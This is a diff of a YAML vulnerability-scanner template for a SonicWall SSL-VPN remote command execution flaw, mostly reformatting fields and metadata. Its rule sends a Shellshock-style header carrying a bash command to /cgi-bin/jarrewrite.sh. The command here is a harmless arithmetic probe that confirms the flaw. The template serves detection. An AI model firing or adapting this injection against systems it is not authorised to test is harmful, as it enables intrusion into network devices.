@@ -1,24 +1,25 @@
 id: sonicwall-ssl-vpn-rce
 
 info:
-    name: SonicWall SSL-VPN 远程命令执行漏洞
-    author: sharecast
-    severity: high
-    description: |
-        SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞
-        app="SONICWALL-SSL-VPN"
-    reference:
-        - http://wiki.peiqi.tech/wiki/iot/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+  name: SonicWall SSL-VPN 远程命令执行漏洞
+  author: sharecast
+  severity: high
+  verified: false
+  description: |
+    SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞
+    fofa: app="SONICWALL-SSL-VPN"
+  tags: sonicwall,vpn,rce
+  created: 2023/12/01
 
 set:
-    r1: randomInt(40000, 44800)
-    r2: randomInt(1140000, 1144800)
+  r1: randomInt(40000, 44800)
+  r2: randomInt(1140000, 1144800)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /cgi-bin/jarrewrite.sh
-            headers:
-                X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
-        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/jarrewrite.sh
+      headers:
+        X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
 expression: r0()
